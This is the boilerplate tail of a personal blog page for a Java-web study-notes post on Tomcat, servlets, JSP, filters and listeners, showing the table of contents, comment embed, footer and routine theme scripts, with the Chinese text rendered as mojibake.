      å¦‚æœæ‚¨å–œæ¬¢æ­¤åšå®¢æˆ–å‘ç°å®ƒå¯¹æ‚¨æœ‰ç”¨ï¼Œåˆ™æ¬¢è¿å¯¹æ­¤å‘è¡¨è¯„è®ºã€‚ä¹Ÿæ¬¢è¿æ‚¨å…±äº«æ­¤åšå®¢ï¼Œä»¥ä¾¿æ›´å¤šäººå¯ä»¥å‚ä¸ã€‚å¦‚æœåšå®¢ä¸­ä½¿ç”¨çš„å›¾åƒä¾µçŠ¯äº†æ‚¨çš„ç‰ˆæƒï¼Œè¯·ä¸ä½œè€…è”ç³»ä»¥å°†å…¶åˆ é™¤ã€‚è°¢è°¢ ï¼
    
  </p>
</div>
<!-- tip end -->

        <!-- tip end -->
        

        
        <!-- Sharing Srtart -->
        <!-- Social Social Share Post -->
<!-- Docs:https://github.com/overtrue/share.js -->

<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
  <ul class="list-inline text-center social-share-ul">
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-twitter">
        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a class="social-share-icon icon-wechat">
        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-weibo">
        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-qq">
        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon" href="mailto:?subject=å­¦ä¹ ç¬”è®° - java-webå­¦ä¹ (ä¸€)&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/82715091/">
        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
      </a>
    </li>
  </ul>
</div>

<!-- css & js -->
<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

        <!-- Sharing End -->
        
        <hr>

        <!-- comments start -->
        <!-- 1. gitalk comment -->


<!-- 2. gitment comment -->


<!-- 4. disqus comment -->

  <!-- disqus comment start -->

  <div class="comment">
    <div id="disqus_thread" class="disqus-thread"></div>
  </div>

  <!-- disqus embedded js code start (one page only need to embed once) -->
  <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = "moryyds-1";
    var disqus_identifier = "https://morblog.cc/posts/82715091/";
    var disqus_url = "https://morblog.cc/posts/82715091/";

    (function () {
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <!-- disqus embedded js code start end -->

  <!-- disqus comment end -->


        <!-- comments end -->
        <hr>

      </div>

      <!-- Catalog: Tabe of Content -->
      <!-- Table of Contents -->

    
      <aside id="sidebar">
        <div id="toc" class="toc-article">
        <strong class="toc-title">ç›®å½•</strong>
        
          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">å­¦ä¹ ç¬”è®° - java-webå­¦ä¹ (ä¸€)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- å‰è¨€ -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- ç¯å¢ƒæ­å»º -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tomcat"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- tomcat -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- å®‰è£… -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- ç¯å¢ƒå˜é‡ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%90%AF%E5%8A%A8-%E5%81%9C%E6%AD%A2"><span class="toc-nav-number">1.2.1.3.</span> <span class="toc-nav-text">- å¯åŠ¨&#x2F;åœæ­¢ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.2.1.4.</span> <span class="toc-nav-text">- é…ç½® -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#IntelliJ-IDEA"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- IntelliJ IDEA -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%85%8D%E7%BD%AEtomcat"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">- é…ç½®tomcat -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%96%B0%E5%BB%BA%E9%A1%B9%E7%9B%AE"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">- æ–°å»ºé¡¹ç›® -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%BF%90%E8%A1%8C"><span class="toc-nav-number">1.2.2.3.</span> <span class="toc-nav-text">- è¿è¡Œ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-2"><span class="toc-nav-number">1.2.2.4.</span> <span class="toc-nav-text">- ç¯å¢ƒå˜é‡ -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%86%85%E5%AE%B9"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- å†…å®¹ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#servlet"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">- servlet -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-nav-number">1.3.1.1.</span> <span class="toc-nav-text">- ç”Ÿå‘½å‘¨æœŸ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-nav-number">1.3.1.2.</span> <span class="toc-nav-text">- ä»£ç  -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-nav-number">1.3.1.3.</span> <span class="toc-nav-text">- ç¤ºä¾‹ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#servlet%E5%92%8Ctomcat%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.3.1.4.</span> <span class="toc-nav-text">- servletå’Œtomcatè¿‡ç¨‹ -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#jsp"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">- jsp -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jsp%E5%92%8Cserlvet%E8%81%94%E7%B3%BB"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">- jspå’Œserlvetè”ç³» -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jsp%E5%92%8Cservlet%E5%8C%BA%E5%88%AB"><span class="toc-nav-number">1.3.2.2.</span> <span class="toc-nav-text">- jspå’ŒservletåŒºåˆ« -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jsp%E5%92%8Ctomcat%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.3.2.3.</span> <span class="toc-nav-text">- jspå’Œtomcatè¿‡ç¨‹ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-nav-number">1.3.2.4.</span> <span class="toc-nav-text">- è¯­æ³• -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%8C%87%E4%BB%A4-directive"><span class="toc-nav-number">1.3.2.5.</span> <span class="toc-nav-text">- æŒ‡ä»¤(directive) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#page"><span class="toc-nav-number">1.3.2.5.1.</span> <span class="toc-nav-text">- page -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#include"><span class="toc-nav-number">1.3.2.5.2.</span> <span class="toc-nav-text">- include -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#taglib"><span class="toc-nav-number">1.3.2.5.3.</span> <span class="toc-nav-text">- taglib -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%A1%8C%E4%B8%BA-action"><span class="toc-nav-number">1.3.2.6.</span> <span class="toc-nav-text">- è¡Œä¸º(action) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#include-2"><span class="toc-nav-number">1.3.2.6.1.</span> <span class="toc-nav-text">- include -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#bean"><span class="toc-nav-number">1.3.2.6.2.</span> <span class="toc-nav-text">- bean -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#xml"><span class="toc-nav-number">1.3.2.6.3.</span> <span class="toc-nav-text">- xml -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#forward"><span class="toc-nav-number">1.3.2.6.4.</span> <span class="toc-nav-text">- forward -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%B9%9D%E5%A4%A7%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1"><span class="toc-nav-number">1.3.2.7.</span> <span class="toc-nav-text">- ä¹å¤§å†…ç½®å¯¹è±¡ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%9B%9B%E5%A4%A7%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-nav-number">1.3.2.8.</span> <span class="toc-nav-text">- å››å¤§ä½œç”¨åŸŸ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#application"><span class="toc-nav-number">1.3.2.8.1.</span> <span class="toc-nav-text">- application -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#page-2"><span class="toc-nav-number">1.3.2.8.2.</span> <span class="toc-nav-text">- page -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#request"><span class="toc-nav-number">1.3.2.8.3.</span> <span class="toc-nav-text">- request -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#session"><span class="toc-nav-number">1.3.2.8.4.</span> <span class="toc-nav-text">- session -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%A0%87%E7%AD%BE-tag"><span class="toc-nav-number">1.3.2.9.</span> <span class="toc-nav-text">- æ ‡ç­¾(tag) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#JSTL%E6%A0%87%E7%AD%BE"><span class="toc-nav-number">1.3.2.9.1.</span> <span class="toc-nav-text">- JSTLæ ‡ç­¾ -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE"><span class="toc-nav-number">1.3.2.9.2.</span> <span class="toc-nav-text">- è‡ªå®šä¹‰æ ‡ç­¾ -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-nav-number">1.3.2.10.</span> <span class="toc-nav-text">- ELè¡¨è¾¾å¼ -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8-filter"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">- è¿‡æ»¤å™¨(filter) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BB%A3%E7%A0%81-2"><span class="toc-nav-number">1.3.3.1.</span> <span class="toc-nav-text">- ä»£ç  -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-nav-number">1.3.3.2.</span> <span class="toc-nav-text">- è‡ªå®šä¹‰è¿‡æ»¤å™¨ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8D%95%E4%B8%AA%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-nav-number">1.3.3.2.1.</span> <span class="toc-nav-text">- å•ä¸ªè¿‡æ»¤å™¨ -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%A4%9A%E4%B8%AA%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-nav-number">1.3.3.2.2.</span> <span class="toc-nav-text">- å¤šä¸ªè¿‡æ»¤å™¨ -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#filter%E5%92%8Ctomcat%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.3.3.3.</span> <span class="toc-nav-text">- filterå’Œtomcatè¿‡ç¨‹ -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8-listener"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">- ç›‘å¬å™¨(listener) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8%E5%88%92%E5%88%86"><span class="toc-nav-number">1.3.4.1.</span> <span class="toc-nav-text">- ç›‘å¬å™¨åˆ’åˆ† -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-nav-number">1.3.4.2.</span> <span class="toc-nav-text">- è‡ªå®šä¹‰ç›‘å¬å™¨ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%9F%9F%E5%AF%B9%E8%B1%A1%E8%87%AA%E8%BA%AB%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%94%80%E6%AF%81%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-nav-number">1.3.4.2.1.</span> <span class="toc-nav-text">- åŸŸå¯¹è±¡è‡ªèº«çš„åˆ›å»ºå’Œé”€æ¯çš„äº‹ä»¶ -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%9F%9F%E5%AF%B9%E8%B1%A1%E4%B8%AD%E5%B1%9E%E6%80%A7%E5%8F%98%E5%8A%A8%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-nav-number">1.3.4.2.2.</span> <span class="toc-nav-text">- åŸŸå¯¹è±¡ä¸­å±æ€§å˜åŠ¨çš„äº‹ä»¶ -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E7%BB%91%E5%AE%9A%E5%88%B0-HttpSession-%E5%9F%9F%E4%B8%AD%E6%9F%90%E4%B8%AA%E5%AF%B9%E8%B1%A1%E7%8A%B6%E6%80%81%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-nav-number">1.3.4.2.3.</span> <span class="toc-nav-text">- ç»‘å®šåˆ° HttpSession åŸŸä¸­æŸä¸ªå¯¹è±¡çŠ¶æ€çš„äº‹ä»¶ -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-nav-number">1.3.5.</span> <span class="toc-nav-text">- å…¶ä»– -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%AE%9E%E4%BE%8B"><span class="toc-nav-number">1.3.5.1.</span> <span class="toc-nav-text">- ç”¨æˆ·ç®¡ç†å®ä¾‹ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%A6%81%E6%B1%82"><span class="toc-nav-number">1.3.5.1.1.</span> <span class="toc-nav-text">- è¦æ±‚ -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-nav-number">1.3.5.1.2.</span> <span class="toc-nav-text">- å®ç° -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-nav-number">1.3.5.1.3.</span> <span class="toc-nav-text">- æµ‹è¯• -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jwt%E7%AE%A1%E7%90%86%E5%AE%9E%E4%BE%8B"><span class="toc-nav-number">1.3.5.2.</span> <span class="toc-nav-text">- jwtç®¡ç†å®ä¾‹ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%A6%81%E6%B1%82-2"><span class="toc-nav-number">1.3.5.2.1.</span> <span class="toc-nav-text">- è¦æ±‚ -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%AE%9E%E7%8E%B0-2"><span class="toc-nav-number">1.3.5.2.2.</span> <span class="toc-nav-text">- å®ç° -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%B5%8B%E8%AF%95-2"><span class="toc-nav-number">1.3.5.2.3.</span> <span class="toc-nav-text">- æµ‹è¯• -</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- æ€»ç»“ -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">- å‚è€ƒ -</span></a></li></ol></li></ol>
        
        </div>
      </aside>
    



      <!-- Sidebar Container -->
      <div class="
                col-lg-8 col-lg-offset-1
                col-md-10 col-md-offset-1
                sidebar-container">

        <!-- Featured Tags -->
        
        <section>
          <!-- no hr -->
          <h5>
            <a href="/tags/">æ ‡ç­¾</a>
          </h5>
          <div class="tags">
            
            <a class="tag" href="/tags/#å®‰å…¨" title="å®‰å…¨">å®‰å…¨</a>
            
            <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
            
          </div>
        </section>
        

        <!-- Friends Blog -->
        
        <hr>
        <h5>æœ‹å‹ä»¬</h5>
        <ul class="list-inline">

          
          <li>
            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
          </li>
          
          <li>
            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
          </li>
          
          <li>
            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
          </li>
          
          <li>
            <a href="https://longlone.top/" target="_blank">Longlone</a>
          </li>
          
          <li>
            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
          </li>
          
        </ul>
        
      </div>
    </div>
  </div>
</article>



<!-- anchorjs start -->
<!-- async load function -->
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script type="text/javascript">
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function(e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  };
</script>
<script type="text/javascript">
  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
    anchors.options = {
      visible: 'hover',
      placement: 'left',
      // icon: 'â„¬'
      icon: 'â¡'
    };
    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
  });
</script>
<style>
  /* place left on bigger screen */
  @media all and (min-width: 800px) {
    .anchorjs-link {
      position: absolute;
      left: -0.75em;
      font-size: 1.1em;
      margin-top: -0.1em;
    }
  }
</style>

<!-- anchorjs end -->



		<!-- Footer (contains ThemeColorã€viewer) -->
		<!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center">
          

          
            <li>
              <a target="_blank" href="https://github.com/Morouu">
                <span class="fa-stack fa-lg">
                  <i class="fa fa-circle fa-stack-2x"></i>
                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
          

          

          

          

          

          

          

        </ul>
        <p class="copyright text-muted">
         &copy; 2022
		 <i class="icon-smile"></i>
          morouu
          <br>
          Theme by
          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
          <span style="display: inline-block; margin: 0 5px;">
            <i class="fa fa-heart"></i>
          </span>
          re-Ported by
          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
          |
          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
        <div class=" copyright text-muted live_time"><span>æœ¬åšå®¢å·²èŒèŒå“’åœ°è¿è¡Œ</span><span id="display_live_time"> 0 å¤© 0 å°æ—¶ 0 åˆ† 0 ç§’</span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-12-27T20:23:15');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div>
		</p>
		
      </div>
    </div>
  </div>
</footer>

<a id="rocket" href="#top" class=""></a>


  <!-- jQuery -->
  <script type="text/javascript" src="/js/jquery.min.js"></script>
  <!-- Bootstrap Core JavaScript -->
  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
  <!-- Custom Theme JavaScript -->
  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
  <!-- catalog -->
  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
  <!-- totop(rocket) -->
  <script async="true" type="text/javascript" src="/js/totop.js"></script>

  
    <!-- Busuanzi JavaScript -->
    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <!-- Scroll start -->
    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
    <!-- Scroll end -->
  

  
    <!-- LangSelect start -->
    <script type="text/javascript" src="/js/langselect.js"></script>
    <!-- LangSelect end -->
  

  
    <!-- Mouseclick -->
    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
  

  
    <!-- ribbon -->
    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
  

  
    <!-- Line start -->
    <script async="text/javascript" src="/js/line.js"></script>
    <!-- Line end -->
  






  <!-- viewer start -->
  <!-- viewer start (Picture preview) -->
  
    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
  

  <!-- viewer end -->


<script>
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function (e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  }

  // fastClick.js
  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
    var $nav = document.querySelector("nav");
    if ($nav)
      FastClick.attach($nav);
    }
  )
</script>

<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->

<!-- jquery.tagcloud.js -->
<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->


		<!-- Search -->
		
		<div class="popup search-popup local-search-popup">
  <span class="popup-btn-close">
    ESC
  </span>
  <div class="container">
    <div class="row">
      <!-- <div class="col-md-9 col-md-offset-1"> -->
      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">

        <div class="local-search-header clearfix">

          <div class="local-search-input-wrapper">
            <span class="search-icon">
              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
            </span>
            <input autocomplete="off" placeholder="æœç´¢..." type="text" id="local-search-input">
          </div>
        </div>
        <div id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>


  
    <script src="/js/ziploader.js"></script>
  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.json";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    // monitor main search box;
    var onPopupClose = function (e) {
      $('.popup').fadeOut(300);
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $('.popup').fadeIn(300);
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }
    // get search zip version
    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
      if (localStorage.getItem('searchVersion') !== res) {
        localStorage.setItem('searchVersion', res);
        initSearchJson();
      }
    });

    function initSearchJson() {
      initLoad(['/search.flv'], {
        loadOptions: {
          success: function (obj) {
            localStorage.setItem('searchJson', obj['search.json'])
          },
          error: function (e) {
            return console.log(e)
          }
        },
        returnOptions: {
          'json': TYPE_TEXT
        },
        mimeOptions: {
          'json': 'application/json'
        }
      })
    }
    // search function;
    var searchFunc = function (search_id, content_id) {
      'use strict';
      isfetched = true;
      var datas = JSON.parse(localStorage.getItem('searchJson'));
      // console.log(search_id)
      var input = document.getElementById(search_id);
      var resultContent = document.getElementById(content_id);
      var inputEventFunction = function () {
        var searchText = input.value.trim().toLowerCase();
        var keywords = searchText.split(/[\s\-]+/);
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        var resultItems = [];
        if (searchText.length > 0) {
          // perform local searching
          datas.forEach(function (data) {
            var isMatch = false;
            var hitCount = 0;
            var searchTextCount = 0;
            var title = data.title
              ? data.title.trim()
              : '';
            var titleInLowerCase = title.toLowerCase();
            var content = data.content
              ? data.content.trim().replace(/<[^>]+>/g, "")
              : '';
            var contentInLowerCase = content.toLowerCase();
            var articleUrl = decodeURIComponent(data.url);

            var date = data.date;
            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
            var imgUrl = data.header_img;
            


            var indexOfTitle = [];
            var indexOfContent = [];
            // only match articles with not empty titles
            keywords.forEach(function (keyword) {
              function getIndexByWord(word, text, caseSensitive) {
                var wordLen = word.length;
                if (wordLen === 0) {
                  return [];
                }
                var startPosition = 0,
                  position = [],
                  index = [];
                if (!caseSensitive) {
                  text = text.toLowerCase();
                  word = word.toLowerCase();
                }
                while ((position = text.indexOf(word, startPosition)) > -1) {
